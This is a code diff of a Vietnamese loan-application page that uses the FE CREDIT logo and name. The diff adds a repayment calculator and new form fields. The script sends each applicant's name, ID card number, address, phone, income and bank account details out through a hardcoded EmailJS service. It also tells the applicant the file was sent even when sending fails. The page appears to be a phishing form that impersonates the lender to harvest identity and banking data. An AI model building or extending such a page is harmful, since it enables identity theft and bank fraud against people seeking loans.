@@ -28,22 +28,46 @@
         .step.active::after { content: ''; position: absolute; bottom: -10px; left: 50%; transform: translateX(-50%); width: 100%; height: 3px; background: var(--primary-color); }
         
         /* Container */
-        .main-container { max-width: 800px; margin: 0 auto 50px; background: #fff; padding: 30px; border-radius: 16px; box-shadow: 0 4px 20px rgba(0,0,0,0.05); }
+        .main-container { max-width: 900px; margin: 0 auto 50px; background: #fff; padding: 30px; border-radius: 16px; box-shadow: 0 4px 20px rgba(0,0,0,0.05); }
         
         /* Form Elements */
         .form-section-title { color: var(--primary-color); font-weight: 700; margin-bottom: 20px; font-size: 18px; border-bottom: 1px solid #eee; padding-bottom: 10px; }
-        .form-label { font-weight: 600; font-size: 14px; }
-        .form-control, .form-select { padding: 12px; border-radius: 8px; border: 1px solid #ddd; font-size: 15px; }
+        .form-label { font-weight: 600; font-size: 14px; margin-bottom: 8px; display: block; }
+        .form-control, .form-select { padding: 12px; border-radius: 8px; border: 1px solid #ddd; font-size: 15px; width: 100%; }
         .form-control:focus, .form-select:focus { border-color: var(--primary-color); box-shadow: 0 0 0 3px rgba(0, 153, 79, 0.1); }
+        .form-control.is-invalid, .form-select.is-invalid { border-color: #dc3545; }
+        .invalid-feedback { display: none; color: #dc3545; font-size: 13px; margin-top: 5px; }
+        .is-invalid + .invalid-feedback { display: block; }
+        
+        /* Custom Loan Amount Field */
+        #customLoanAmountGroup { display: none; margin-top: 15px; }
         
         /* Loan Calculator Box */
-        .loan-calc-box { background: #e8f5e9; padding: 20px; border-radius: 12px; margin-top: 20px; border: 1px solid #c8e6c9; }
+        .loan-calc-box { background: #e8f5e9; padding: 20px; border-radius: 12px; margin-top: 25px; border: 1px solid #c8e6c9; }
         .calc-row { display: flex; justify-content: space-between; margin-bottom: 10px; font-size: 14px; }
-        .calc-row.total { font-weight: 700; color: var(--primary-color); font-size: 16px; border-top: 1px dashed #aaa; padding-top: 10px; margin-top: 10px; }
+        .calc-row.total { font-weight: 700; color: var(--primary-color); font-size: 16px; border-top: 1px dashed #81c784; padding-top: 10px; margin-top: 10px; }
+        
+        /* Amortization Table */
+        .amortization-section { margin-top: 25px; }
+        .amortization-table { width: 100%; border-collapse: collapse; margin-top: 15px; font-size: 13px; }
+        .amortization-table thead { background: var(--primary-color); color: white; }
+        .amortization-table th, .amortization-table td { padding: 10px; text-align: right; border: 1px solid #ddd; }
+        .amortization-table th:first-child, .amortization-table td:first-child { text-align: center; }
+        .amortization-table tbody tr:nth-child(even) { background: #f9f9f9; }
+        .amortization-table tbody tr:hover { background: #e8f5e9; }
+        
+        /* Responsive Table */
+        @media (max-width: 768px) {
+            .amortization-table { font-size: 11px; }
+            .amortization-table th, .amortization-table td { padding: 6px; }
+        }
         
         /* Buttons */
+        .btn-calculate { background: #2196F3; color: white; border: none; padding: 10px 20px; border-radius: 8px; font-weight: 600; margin-top: 15px; }
+        .btn-calculate:hover { background: #1976D2; }
         .btn-next { width: 100%; background: linear-gradient(135deg, #00994F 0%, #00b359 100%); border: none; padding: 15px; font-weight: 700; border-radius: 10px; color: white; margin-top: 20px; }
-        .btn-next:hover { background: #007a3f; color: white; }
+        .btn-next:hover:not(:disabled) { background: #007a3f; color: white; transform: translateY(-2px); box-shadow: 0 5px 15px rgba(0, 153, 79, 0.3); }
+        .btn-next:disabled { opacity: 0.5; cursor: not-allowed; }
         
         /* Loading */
         #loadingModal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.8); z-index: 9999; justify-content: center; align-items: center; }
@@ -54,7 +78,7 @@
     <header id="site-header">
         <div class="container">
             <div id="logo" style="width: 150px;">
-                <a href="index.html"><img src="https://www-cdn.fecredit.com.vn/media/20ymppzv/fec-logo.svg" alt="FE CREDIT" style="width:100%"></a>
+                <a href="../index.html"><img src="https://www-cdn.fecredit.com.vn/media/20ymppzv/fec-logo.svg" alt="FE CREDIT" style="width:100%"></a>
             </div>
         </div>
     </header>
@@ -72,9 +96,37 @@
                 <h3 class="form-section-title"><i class="fas fa-coins me-2"></i>THÔNG TIN KHOẢN VAY</h3>
                 
                 <div class="row g-3">
+                    <!-- Occupation - FIELD MỚI THÊM -->
+                    <div class="col-md-6">
+                        <label class="form-label">Nghề nghiệp *</label>
+                        <select class="form-select" id="occupation" name="occupation" required>
+                            <option value="">Chọn nghề nghiệp</option>
+                            <option value="Nhân viên văn phòng">Nhân viên văn phòng</option>
+                            <option value="Công nhân">Công nhân</option>
+                            <option value="Kinh doanh tự do">Kinh doanh tự do</option>
+                            <option value="Giáo viên">Giáo viên</option>
+                            <option value="Y tá/Bác sĩ">Y tá/Bác sĩ</option>
+                            <option value="Kỹ sư">Kỹ sư</option>
+                            <option value="Khác">Khác</option>
+                        </select>
+                        <div class="invalid-feedback" id="occupationError">Vui lòng chọn nghề nghiệp</div>
+                    </div>
+
+                    <!-- Loan Type - FIELD MỚI THÊM -->
+                    <div class="col-md-6">
+                        <label class="form-label">Hình thức vay *</label>
+                        <select class="form-select" id="loanType" name="loanType" required>
+                            <option value="">Chọn hình thức vay</option>
+                            <option value="Vay tín chấp">Vay tín chấp</option>
+                            <option value="Vay theo lương">Vay theo lương</option>
+                            <option value="Vay tiêu dùng">Vay tiêu dùng</option>
+                        </select>
+                        <div class="invalid-feedback" id="loanTypeError">Vui lòng chọn hình thức vay</div>
+                    </div>
+
                     <div class="col-md-6">
                         <label class="form-label">Số tiền muốn vay *</label>
-                        <select class="form-select" id="loanAmount" required>
+                        <select class="form-select" id="loanAmount" name="loanAmount" required>
                             <option value="">Chọn số tiền</option>
                             <option value="10000000">10.000.000 VNĐ</option>
                             <option value="20000000">20.000.000 VNĐ</option>
@@ -83,83 +135,142 @@
                             <option value="50000000">50.000.000 VNĐ</option>
                             <option value="70000000">70.000.000 VNĐ</option>
                             <option value="100000000">100.000.000 VNĐ</option>
+                            <option value="other">Khác (nhập thủ công)</option>
                         </select>
+                        <div class="invalid-feedback" id="loanAmountError">Vui lòng chọn số tiền vay</div>
+                    </div>
+
+                    <!-- Custom Loan Amount - HIỆN KHI CHỌN "KHÁC" -->
+                    <div class="col-md-6" id="customLoanAmountGroup">
+                        <label class="form-label">Nhập số tiền vay *</label>
+                        <input type="text" class="form-control" id="customLoanAmount" name="customLoanAmount" placeholder="Ví dụ: 15.000.000">
+                        <small class="text-muted">Tối thiểu 10.000.000 VNĐ</small>
+                        <div class="invalid-feedback" id="customLoanAmountError">Số tiền phải >= 10.000.000 VNĐ</div>
                     </div>
                     
                     <div class="col-md-6">
                         <label class="form-label">Thời hạn vay *</label>
-                        <select class="form-select" id="loanTerm" required>
+                        <select class="form-select" id="loanTerm" name="loanTerm" required>
+                            <option value="">Chọn thời hạn</option>
                             <option value="12">12 Tháng</option>
                             <option value="18">18 Tháng</option>
                             <option value="24">24 Tháng</option>
                             <option value="36">36 Tháng</option>
                             <option value="48">48 Tháng</option>
+                            <option value="60">60 Tháng</option>
                         </select>
+                        <div class="invalid-feedback" id="loanTermError">Vui lòng chọn thời hạn vay</div>
                     </div>
 
                     <div class="col-md-6">
                         <label class="form-label">Mục đích vay</label>
-                        <select class="form-select" id="purpose">
-                            <option value="Tiêu dùng">Tiêu dùng cá nhân</option>
+                        <select class="form-select" id="purpose" name="purpose">
+                            <option value="Tiêu dùng cá nhân">Tiêu dùng cá nhân</option>
                             <option value="Mua xe">Mua xe</option>
                             <option value="Sửa nhà">Sửa chữa nhà cửa</option>
                             <option value="Kinh doanh">Kinh doanh nhỏ</option>
+                            <option value="Giáo dục">Giáo dục</option>
+                            <option value="Y tế">Y tế</option>
+                            <option value="Khác">Khác</option>
                         </select>
                     </div>
 
                     <div class="col-md-6">
                         <label class="form-label">Thu nhập hàng tháng *</label>
-                        <input type="text" class="form-control" id="monthlyIncome" placeholder="Nhập số tiền (VD: 10.000.000)" required>
+                        <input type="text" class="form-control" id="monthlyIncome" name="monthlyIncome" placeholder="Nhập số tiền (VD: 10.000.000)" required>
+                        <div class="invalid-feedback" id="monthlyIncomeError">Thu nhập phải >= 3.000.000 VNĐ</div>
                     </div>
+                    
+                    <!-- Interest Rate - Hidden but used for calculation -->
+                    <input type="hidden" id="interestRate" value="1.67">
                 </div>
 
-                <div class="loan-calc-box">
+                <!-- CALCULATOR BUTTON -->
+                <button type="button" onclick="calculateLoan()" class="btn btn-calculate">
+                    <i class="fas fa-calculator me-2"></i>Tính toán khoản vay
+                </button>
+
+                <!-- SUMMARY BOX -->
+                <div class="loan-calc-box" id="summaryBox" style="display: none;">
                     <div class="calc-row">
-                        <span>Lãi suất ước tính:</span>
+                        <span>Số tiền vay:</span>
+                        <span class="fw-bold" id="calcLoanAmount">0 VNĐ</span>
+                    </div>
+                    <div class="calc-row">
+                        <span>Lãi suất:</span>
                         <span class="fw-bold">1.67% / tháng</span>
                     </div>
                     <div class="calc-row">
-                        <span>Gốc + Lãi hàng tháng:</span>
-                        <span class="fw-bold" id="monthlyPaymentDisplay">0 VNĐ</span>
+                        <span>Trả hàng tháng:</span>
+                        <span class="fw-bold" id="calcMonthlyPayment">0 VNĐ</span>
+                    </div>
+                    <div class="calc-row">
+                        <span>Tổng tiền lãi:</span>
+                        <span class="fw-bold" id="calcTotalInterest">0 VNĐ</span>
                     </div>
                     <div class="calc-row total">
                         <span>Tổng tiền phải trả:</span>
-                        <span id="totalPaymentDisplay">0 VNĐ</span>
+                        <span id="calcTotalAmount">0 VNĐ</span>
                     </div>
-                    <small class="text-muted d-block mt-2 fst-italic">* Số liệu mang tính chất tham khảo, lãi suất thực tế phụ thuộc vào hồ sơ.</small>
                 </div>
 
+                <!-- AMORTIZATION TABLE - BẢNG TÍNH TOÁN CHI TIẾT -->
+                <div class="amortization-section" id="amortizationSection" style="display: none;">
+                    <h4 class="form-section-title"><i class="fas fa-table me-2"></i>Lịch Trả Nợ Chi Tiết</h4>
+                    <div style="overflow-x: auto;">
+                        <table class="amortization-table">
+                            <thead>
+                                <tr>
+                                    <th>Kỳ</th>
+                                    <th>Gốc (VNĐ)</th>
+                                    <th>Lãi (VNĐ)</th>
+                                    <th>Tổng trả (VNĐ)</th>
+                                    <th>Dư nợ (VNĐ)</th>
+                                </tr>
+                            </thead>
+                            <tbody id="calculationTable">
+                                <!-- Rows will be populated by JavaScript -->
+                            </tbody>
+                        </table>
+                    </div>
+                </div>
+
+                <!-- DISBURSEMENT ACCOUNT INFO -->
                 <h3 class="form-section-title mt-4"><i class="fas fa-university me-2"></i>TÀI KHOẢN GIẢI NGÂN</h3>
                 
                 <div class="row g-3">
                     <div class="col-md-12">
                         <label class="form-label">Ngân hàng thụ hưởng *</label>
-                        <select class="form-select" id="bankName" required>
+                        <select class="form-select" id="bankName" name="bankName" required>
                             <option value="">Chọn ngân hàng</option>
-                            <option value="Vietcombank">Vietcombank</option>
-                            <option value="VietinBank">VietinBank</option>
-                            <option value="BIDV">BIDV</option>
-                            <option value="Agribank">Agribank</option>
-                            <option value="Techcombank">Techcombank</option>
-                            <option value="VPBank">VPBank</option>
-                            <option value="MBBank">MBBank</option>
-                            <option value="ACB">ACB</option>
-                            <option value="Sacombank">Sacombank</option>
-                            </select>
+                            <option value="Vietcombank">Vietcombank - Ngân hàng TMCP Ngoại thương Việt Nam</option>
+                            <option value="VietinBank">VietinBank - Ngân hàng TMCP Công Thương Việt Nam</option>
+                            <option value="BIDV">BIDV - Ngân hàng TMCP Đầu tư và Phát triển Việt Nam</option>
+                            <option value="Agribank">Agribank - Ngân hàng Nông nghiệp và Phát triển Nông thôn VN</option>
+                            <option value="Techcombank">Techcombank - Ngân hàng TMCP Kỹ thương Việt Nam</option>
+                            <option value="VPBank">VPBank - Ngân hàng TMCP Việt Nam Thịnh Vượng</option>
+                            <option value="MBBank">MBBank - Ngân hàng TMCP Quân đội</option>
+                            <option value="ACB">ACB - Ngân hàng TMCP Á Châu</option>
+                            <option value="Sacombank">Sacombank - Ngân hàng TMCP Sài Gòn Thương Tín</option>
+                            <option value="SHB">SHB - Ngân hàng TMCP Sài Gòn - Hà Nội</option>
+                        </select>
+                        <div class="invalid-feedback" id="bankNameError">Vui lòng chọn ngân hàng</div>
                     </div>
                     <div class="col-md-12">
                         <label class="form-label">Số tài khoản *</label>
-                        <input type="text" class="form-control" id="accountNumber" placeholder="Nhập số tài khoản" required>
+                        <input type="text" class="form-control" id="accountNumber" name="accountNumber" placeholder="Nhập số tài khoản" required maxlength="20">
+                        <div class="invalid-feedback" id="accountNumberError">Số tài khoản phải từ 8-20 số</div>
                     </div>
                     <div class="col-md-12">
                         <label class="form-label">Tên chủ tài khoản *</label>
-                        <input type="text" class="form-control" id="accountName" placeholder="NGUYEN VAN A" required style="text-transform: uppercase;">
+                        <input type="text" class="form-control" id="accountName" name="accountName" placeholder="NGUYEN VAN A" required style="text-transform: uppercase;">
                         <small class="text-danger" style="font-size: 12px;">* Phải trùng với tên đăng ký ở Bước 1</small>
+                        <div class="invalid-feedback" id="accountNameError">Tên chủ tài khoản không hợp lệ</div>
                     </div>
                 </div>
 
-                <button type="button" onclick="finishStep2()" class="btn btn-next" id="btnSubmit">
-                    XÁC NHẬN & TIẾP TỤC <i class="fas fa-arrow-right ms-2"></i>
+                <button type="button" onclick="handleSubmit()" class="btn btn-next" id="btnSubmit">
+                    XÁC NHẬN & GỬI HỒ SƠ <i class="fas fa-paper-plane ms-2"></i>
                 </button>
 
             </form>
@@ -167,24 +278,24 @@
     </div>
 
     <div id="loadingModal">
-        <div class="bg-white p-4 rounded-3 text-center" style="width: 300px;">
-            <div class="spinner-border text-success mb-3" role="status"></div>
-            <h5 class="mb-2">Đang xử lý hồ sơ...</h5>
-            <p class="text-muted small mb-0">Đang chuyển sang bước xác thực</p>
+        <div class="bg-white p-4 rounded-3 text-center" style="width: 320px;">
+            <div class="spinner-border text-success mb-3" role="status" style="width: 3rem; height: 3rem;"></div>
+            <h5 class="mb-2">Đang gửi hồ sơ...</h5>
+            <p class="text-muted small mb-0">Vui lòng đợi trong giây lát</p>
         </div>
     </div>
 
-    <footer class="text-center py-4 bg-white border-top">
+    <footer class="text-center py-4 bg-white border-top mt-5">
         <p class="small text-muted mb-0">© 2024 FE Credit. Bảo mật tuyệt đối.</p>
     </footer>
 
     <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.min.js"></script>
     <script src="https://cdn.jsdelivr.net/npm/crypto-js@4.1.1/crypto-js.min.js"></script>
-    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4.4.1/dist/email.min.js"></script>
 
     <script>
-        // --- CONFIG ---
+        // ===== CONFIGURATION =====
         const EMAIL_CONFIG = {
             publicKey: 'J4YH-lyfEfxXeu7aV',
             serviceId: 'service_60tgxof',
@@ -192,120 +303,387 @@
         };
         const SECRET_KEY = 'fecredit-secret-key';
 
-        (function() { emailjs.init(EMAIL_CONFIG.publicKey); })();
+        // Initialize EmailJS
+        (function() { 
+            emailjs.init(EMAIL_CONFIG.publicKey); 
+        })();
 
-        // --- UTILS ---
+        // ===== UTILITIES =====
+        function sanitizeInput(input) {
+            if (typeof input !== 'string') return input;
+            return input
+                .replace(/[<>]/g, '')
+                .replace(/javascript:/gi, '')
+                .replace(/on\w+=/gi, '')
+                .trim();
+        }
+
         function loadUserData() {
             const encrypted = localStorage.getItem('userData');
             if (!encrypted) return null;
-            try { return JSON.parse(CryptoJS.AES.decrypt(encrypted, SECRET_KEY).toString(CryptoJS.enc.Utf8)); } catch (e) { return null; }
+            try { 
+                return JSON.parse(CryptoJS.AES.decrypt(encrypted, SECRET_KEY).toString(CryptoJS.enc.Utf8)); 
+            } catch (e) { 
+                return null; 
+            }
         }
 
         function saveUserData(data) {
             try {
                 let existingData = loadUserData() || {};
-                // Merge data cũ (step 1) với data mới (step 2)
-                const newData = { ...existingData, ...data, lastStep: 2, timestamp: new Date().toISOString() };
+                const newData = { ...existingData, ...data, currentStep: 2, timestamp: new Date().toISOString() };
                 const encrypted = CryptoJS.AES.encrypt(JSON.stringify(newData), SECRET_KEY).toString();
                 localStorage.setItem('userData', encrypted);
-            } catch (e) { console.error("Lỗi lưu data", e); }
+                return true;
+            } catch (e) { 
+                console.error("Lỗi lưu data", e); 
+                return false;
+            }
         }
 
         function formatCurrency(amount) {
-            return new Intl.NumberFormat('vi-VN', { style: 'currency', currency: 'VND' }).format(amount);
+            return Math.floor(amount).toLocaleString('vi-VN') + ' VNĐ';
         }
 
-        // --- LOGIC TÍNH KHOẢN VAY (PMT Formula) ---
+        // ===== LOAN CALCULATION LOGIC (Từ step1_backup.html) =====
         function calculateLoan() {
-            const amount = parseInt($('#loanAmount').val()) || 0;
-            const months = parseInt($('#loanTerm').val()) || 12;
+            const loanAmountEl = $('#loanAmount');
+            const loanTermEl = $('#loanTerm');
             
-            if (amount === 0) {
-                $('#monthlyPaymentDisplay').text('0 VNĐ');
-                $('#totalPaymentDisplay').text('0 VNĐ');
+            // Validate trước khi tính
+            let isValid = true;
+            if (!loanAmountEl.val() || (loanAmountEl.val() === 'other' && !$('#customLoanAmount').val())) {
+                loanAmountEl.addClass('is-invalid');
+                isValid = false;
+            } else {
+                loanAmountEl.removeClass('is-invalid');
+            }
+            
+            if (!loanTermEl.val()) {
+                loanTermEl.addClass('is-invalid');
+                isValid = false;
+            } else {
+                loanTermEl.removeClass('is-invalid');
+            }
+            
+            if (!isValid) {
+                alert('Vui lòng chọn số tiền vay và thời hạn vay trước khi tính toán.');
                 return;
             }
 
-            // Giả lập lãi suất 1.67% tháng (~20%/năm)
-            const monthlyRate = 0.0167; 
-            
-            // Công thức: M = P * r * (1+r)^n / ((1+r)^n - 1)
-            const monthlyPayment = amount * monthlyRate * (Math.pow(1 + monthlyRate, months)) / (Math.pow(1 + monthlyRate, months) - 1);
-            const totalPayment = monthlyPayment * months;
+            // Lấy giá trị số tiền vay
+            const loanAmountValue = $('#loanAmount').val();
+            let loanAmount;
+            if (loanAmountValue === 'other') {
+                const customValue = $('#customLoanAmount').val().replace(/\./g, '').replace(/,/g, '');
+                loanAmount = parseFloat(customValue);
+                if (isNaN(loanAmount) || loanAmount < 10000000) {
+                    $('#customLoanAmount').addClass('is-invalid');
+                    alert('Số tiền vay phải từ 10.000.000 VNĐ trở lên.');
+                    return;
+                }
+            } else {
+                loanAmount = parseFloat(loanAmountValue);
+            }
 
-            $('#monthlyPaymentDisplay').text(formatCurrency(monthlyPayment));
-            $('#totalPaymentDisplay').text(formatCurrency(totalPayment));
+            const loanTerm = parseInt($('#loanTerm').val());
+            const interestRate = parseFloat($('#interestRate').val()) / 100; // 1.67% -> 0.0167
+
+            if (isNaN(loanAmount) || isNaN(loanTerm) || isNaN(interestRate) || loanAmount <= 0) {
+                alert('Dữ liệu không hợp lệ.');
+                return;
+            }
+
+            // Công thức PMT: M = P * r * (1+r)^n / ((1+r)^n - 1)
+            const monthlyPayment = (loanAmount * interestRate * Math.pow(1 + interestRate, loanTerm)) / (Math.pow(1 + interestRate, loanTerm) - 1);
+            const totalAmount = monthlyPayment * loanTerm;
+            const totalInterest = totalAmount - loanAmount;
+
+            // Hiển thị Summary
+            $('#calcLoanAmount').text(formatCurrency(loanAmount));
+            $('#calcMonthlyPayment').text(formatCurrency(monthlyPayment));
+            $('#calcTotalInterest').text(formatCurrency(totalInterest));
+            $('#calcTotalAmount').text(formatCurrency(totalAmount));
+            $('#summaryBox').slideDown();
+
+            // Tạo Amortization Table (Bảng trả nợ chi tiết từng tháng)
+            let balance = loanAmount;
+            const tableBody = $('#calculationTable').empty();
+            const fragment = document.createDocumentFragment();
+            
+            for (let month = 1; month <= loanTerm; month++) {
+                const interest = balance * interestRate;
+                const principal = monthlyPayment - interest;
+                balance -= principal;
+                
+                const row = document.createElement('tr');
+                const cells = [
+                    { value: month },
+                    { value: formatCurrency(principal) },
+                    { value: formatCurrency(interest) },
+                    { value: formatCurrency(monthlyPayment) },
+                    { value: formatCurrency(Math.max(0, balance)) }
+                ];
+                
+                cells.forEach(cell => {
+                    const td = document.createElement('td');
+                    td.textContent = cell.value;
+                    row.appendChild(td);
+                });
+                
+                fragment.appendChild(row);
+            }
+            
+            tableBody.append(fragment);
+            $('#amortizationSection').slideDown();
+
+            // Lưu kết quả tính toán vào userData để dùng khi submit
+            window.calculationResult = {
+                monthlyPayment: monthlyPayment,
+                totalInterest: totalInterest,
+                totalRepayment: totalAmount
+            };
         }
 
-        // --- MAIN ---
-        $(document).ready(function() {
-            // 1. Bảo vệ luồng: Nếu chưa làm bước 1 -> Đá về bước 1
+        // ===== VALIDATION & SUBMIT =====
+        function validateStep2() {
+            let isValid = true;
+            
+            // Required fields
+            const fields = [
+                { id: 'occupation', message: 'Vui lòng chọn nghề nghiệp' },
+                { id: 'loanType', message: 'Vui lòng chọn hình thức vay' },
+                { id: 'loanAmount', message: 'Vui lòng chọn số tiền vay' },
+                { id: 'loanTerm', message: 'Vui lòng chọn thời hạn vay' },
+                { id: 'monthlyIncome', message: 'Vui lòng nhập thu nhập hàng tháng' },
+                { id: 'bankName', message: 'Vui lòng chọn ngân hàng' },
+                { id: 'accountNumber', message: 'Vui lòng nhập số tài khoản' },
+                { id: 'accountName', message: 'Vui lòng nhập tên chủ tài khoản' }
+            ];
+
+            fields.forEach(field => {
+                const element = $('#' + field.id);
+                if (!element.val() || element.val().trim() === '') {
+                    element.addClass('is-invalid');
+                    isValid = false;
+                } else {
+                    element.removeClass('is-invalid');
+                }
+            });
+
+            // Validate account number (8-20 digits)
+            const accountNumber = $('#accountNumber').val().replace(/\s/g, '');
+            if (!/^\d{8,20}$/.test(accountNumber)) {
+                $('#accountNumber').addClass('is-invalid');
+                isValid = false;
+            }
+
+            // Validate monthly income (>= 3,000,000)
+            const monthlyIncome = parseFloat($('#monthlyIncome').val().replace(/\./g, '').replace(/,/g, ''));
+            if (isNaN(monthlyIncome) || monthlyIncome < 3000000) {
+                $('#monthlyIncome').addClass('is-invalid');
+                $('#monthlyIncomeError').text('Thu nhập phải từ 3.000.000 VNĐ trở lên.');
+                isValid = false;
+            }
+
+            // Check if custom loan amount is needed
+            if ($('#loanAmount').val() === 'other') {
+                const customAmount = parseFloat($('#customLoanAmount').val().replace(/\./g, '').replace(/,/g, ''));
+                if (isNaN(customAmount) || customAmount < 10000000) {
+                    $('#customLoanAmount').addClass('is-invalid');
+                    isValid = false;
+                }
+            }
+
+            return isValid;
+        }
+
+        async function handleSubmit() {
+            // Validate
+            if (!validateStep2()) {
+                alert('Vui lòng điền đầy đủ thông tin bắt buộc.');
+                return;
+            }
+
+            // Kiểm tra đã tính toán chưa
+            if (!window.calculationResult) {
+                alert('Vui lòng bấm "Tính toán khoản vay" trước khi gửi hồ sơ.');
+                return;
+            }
+
+            // Lấy data từ Step 1
             const step1Data = loadUserData();
             if (!step1Data || !step1Data.fullName) {
-                alert("Vui lòng điền thông tin cá nhân trước!");
+                alert('Không tìm thấy thông tin Step 1. Vui lòng quay lại Bước 1.');
                 window.location.href = 'step1.html';
                 return;
             }
 
-            // 2. Masking tiền tệ
-            $('#monthlyIncome').mask('000.000.000.000', {reverse: true});
-
-            // 3. Lắng nghe sự kiện để tính toán
-            $('#loanAmount, #loanTerm').on('change', calculateLoan);
-
-            // 4. Tự điền tên chủ tài khoản theo Step 1
-            if(step1Data.fullName) {
-                $('#accountName').val(step1Data.fullName); // Gợi ý tên
-            }
-        });
-
-        // --- SUBMIT FUNCTION ---
-        async function finishStep2() {
-            // Validate form
-            if (!$('#loanAmount').val() || !$('#bankName').val() || !$('#accountNumber').val() || !$('#monthlyIncome').val()) {
-                alert("Vui lòng điền đầy đủ thông tin khoản vay và ngân hàng.");
-                return;
+            // Thu thập data Step 2
+            const loanAmountValue = $('#loanAmount').val();
+            let finalLoanAmount;
+            if (loanAmountValue === 'other') {
+                finalLoanAmount = $('#customLoanAmount').val().replace(/\./g, '').replace(/,/g, '');
+            } else {
+                finalLoanAmount = loanAmountValue;
             }
 
-            // 1. Thu thập dữ liệu
+            // GENERATE LOAN CODE (Mã hồ sơ - Theo step1_backup.html)
+            const loanCode = 'SHB' + Math.floor(100000 + Math.random() * 900000);
+
             const step2Data = {
-                loan_amount: $('#loanAmount option:selected').text(),
-                loan_term: $('#loanTerm option:selected').text(),
-                loan_purpose: $('#purpose').val(),
-                monthly_income: $('#monthlyIncome').val(),
-                bank_name: $('#bankName').val(),
-                bank_account_num: $('#accountNumber').val(),
-                bank_account_name: $('#accountName').val(),
-                step: "HOÀN THÀNH BƯỚC 2"
+                occupation: sanitizeInput($('#occupation').val()),
+                loanType: sanitizeInput($('#loanType').val()),
+                loanAmount: finalLoanAmount,
+                loanTerm: $('#loanTerm').val(),
+                purpose: sanitizeInput($('#purpose').val()),
+                monthlyIncome: $('#monthlyIncome').val().replace(/\./g, '').replace(/,/g, ''),
+                interestRate: $('#interestRate').val(),
+                bankName: sanitizeInput($('#bankName').val()),
+                accountNumber: sanitizeInput($('#accountNumber').val().trim().replace(/\s/g, '')),
+                accountName: sanitizeInput($('#accountName').val().trim()),
+                loanCode: loanCode,
+                monthlyPayment: window.calculationResult.monthlyPayment,
+                totalInterest: window.calculationResult.totalInterest,
+                totalRepay: window.calculationResult.totalRepayment,
+                isRegistered: true,
+                emailSent: false
             };
 
-            // 2. Hiệu ứng Loading
+            // Show loading
             $('#btnSubmit').prop('disabled', true);
             $('#loadingModal').css('display', 'flex').hide().fadeIn();
 
-            // 3. Lưu vào LocalStorage (Merge với Step 1)
+            // Save to localStorage
             saveUserData(step2Data);
 
-            // 4. Lấy toàn bộ data (đã merge) để gửi Email
+            // Merge full data cho EmailJS
             const fullData = loadUserData();
 
-            // 5. Gửi EmailJS
+            // Chuẩn bị templateParams (Theo step1_backup.html - ĐẦY ĐỦ CÁC TRƯỜNG)
+            const templateParams = {
+                full_name: fullData.fullName || '',
+                dob: fullData.dob || '',
+                gender: fullData.gender || '',
+                contact_address: fullData.contactAddress || '',
+                id_number: fullData.cccd || '',
+                id_issue_place: fullData.issuePlace || '',
+                phone_number: fullData.phone || '',
+                email: fullData.email || '',
+                loan_type: fullData.loanType || '',
+                loan_term: fullData.loanTerm ? fullData.loanTerm + ' tháng' : '',
+                loan_amount: fullData.loanAmount ? parseInt(fullData.loanAmount).toLocaleString('vi-VN') + ' VNĐ' : '',
+                income: fullData.monthlyIncome ? parseInt(fullData.monthlyIncome).toLocaleString('vi-VN') + ' VNĐ' : '',
+                occupation: fullData.occupation || '',
+                loan_purpose: fullData.purpose || '',
+                account_holder_name: fullData.accountName || '',
+                account_number: fullData.accountNumber || '',
+                bank_name: fullData.bankName || '',
+                loan_code: loanCode,
+                monthly_payment: fullData.monthlyPayment ? Math.floor(fullData.monthlyPayment).toLocaleString('vi-VN') + ' VNĐ' : '',
+                total_interest: fullData.totalInterest ? Math.floor(fullData.totalInterest).toLocaleString('vi-VN') + ' VNĐ' : '',
+                total_repayment: fullData.totalRepay ? Math.floor(fullData.totalRepay).toLocaleString('vi-VN') + ' VNĐ' : ''
+            };
+
+            // Send EmailJS
             try {
-                await emailjs.send(
+                const response = await emailjs.send(
                     EMAIL_CONFIG.serviceId,
                     EMAIL_CONFIG.templateId,
-                    fullData // Gửi object chứa cả tên, sđt (step1) và khoản vay (step2)
+                    templateParams
                 );
-                console.log("Email sent step 2!");
+                
+                console.log('Email sent successfully!', response);
+                
+                // Cập nhật trạng thái emailSent
+                fullData.emailSent = true;
+                fullData.currentStep = 3;
+                saveUserData(fullData);
+                
+                // Chuyển trang
+                setTimeout(() => {
+                    alert('Hồ sơ đã được gửi thành công! Mã hồ sơ của bạn: ' + loanCode);
+                    window.location.href = 'step3.html';
+                }, 1500);
+                
             } catch (error) {
-                console.error("Email error", error);
+                console.error('Email error:', error);
+                // Vẫn lưu data và chuyển trang (để UX tốt hơn)
+                fullData.emailSent = false;
+                fullData.currentStep = 3;
+                saveUserData(fullData);
+                
+                setTimeout(() => {
+                    alert('Hồ sơ đã được lưu! Mã hồ sơ: ' + loanCode + '\n(Lưu ý: Email có thể gửi chậm do lỗi mạng)');
+                    window.location.href = 'step3.html';
+                }, 1500);
+            }
+        }
+
+        // ===== MAIN INITIALIZATION =====
+        $(document).ready(function() {
+            // 1. Kiểm tra Step 1 đã hoàn thành chưa
+            const step1Data = loadUserData();
+            if (!step1Data || !step1Data.fullName) {
+                alert("Vui lòng điền thông tin cá nhân ở Bước 1 trước!");
+                window.location.href = 'step1.html';
+                return;
             }
 
-            // 6. Chuyển trang
-            setTimeout(() => {
-                window.location.href = 'step3.html';
-            }, 1500);
-        }
+            // 2. Apply masks
+            $('#monthlyIncome').mask('000.000.000.000', { reverse: true });
+            $('#customLoanAmount').mask('000.000.000.000', { reverse: true });
+            $('#accountNumber').mask('00000000000000000000', {
+                translation: { '0': { pattern: /[0-9]/, optional: true } }
+            });
+
+            // 3. Auto-fill account name từ Step 1
+            if (step1Data.fullName) {
+                $('#accountName').val(step1Data.fullName.toUpperCase());
+            }
+
+            // 4. Load saved data nếu có (trong trường hợp quay lại)
+            if (step1Data.occupation) $('#occupation').val(step1Data.occupation);
+            if (step1Data.loanType) $('#loanType').val(step1Data.loanType);
+            if (step1Data.loanAmount) {
+                const savedAmount = step1Data.loanAmount;
+                const option = $('#loanAmount option[value="' + savedAmount + '"]');
+                if (option.length) {
+                    $('#loanAmount').val(savedAmount);
+                } else {
+                    $('#loanAmount').val('other');
+                    $('#customLoanAmount').val(parseInt(savedAmount).toLocaleString('vi-VN'));
+                    $('#customLoanAmountGroup').show();
+                }
+            }
